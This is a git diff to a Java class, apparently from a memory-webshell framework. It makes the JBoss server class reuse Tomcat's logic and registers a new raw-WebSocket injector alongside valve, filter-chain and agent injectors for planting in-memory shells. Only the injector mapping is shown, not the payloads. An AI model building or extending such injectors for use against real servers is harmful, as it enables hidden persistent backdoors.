@@ -1,6 +1,5 @@
 package com.reajason.javaweb.memshell.server.jboss;
 
-import com.reajason.javaweb.memshell.server.AbstractServer;
 import com.reajason.javaweb.memshell.server.InjectorMapping;
 import com.reajason.javaweb.memshell.server.tomcat.Tomcat;
 
@@ -8,15 +7,13 @@ import com.reajason.javaweb.memshell.server.tomcat.Tomcat;
 import static com.reajason.javaweb.memshell.ShellType.*;
 
 /**
+ * JBoss AS 4 ~ 7.1 / EAP 6 的 Web 容器是 JBossWeb（Tomcat 分支），
+ * 因此复用 Tomcat 的注入器和 RawWebSocket helper；EAP 7+/WildFly 走 Undertow。
+ *
  * @author ReaJason
  * @since 2024/12/10
  */
-public class Jboss extends AbstractServer {
-
-    @Override
-    public Class<?> getListenerInterceptor() {
-        return Tomcat.ListenerInterceptor.class;
-    }
+public class Jboss extends Tomcat {
 
     @Override
     public InjectorMapping getShellInjectorMapping() {
@@ -27,6 +24,7 @@ public class Jboss extends AbstractServer {
                 .addInjector(PROXY_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatProxyValveInjector")
                 .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.tomcat.TomcatFilterChainAgentInjector")
                 .addInjector(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.injector.tomcat.TomcatContextValveAgentInjector")
+                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.tomcat.TomcatRawWsInjector")
                 .build();
     }
 }
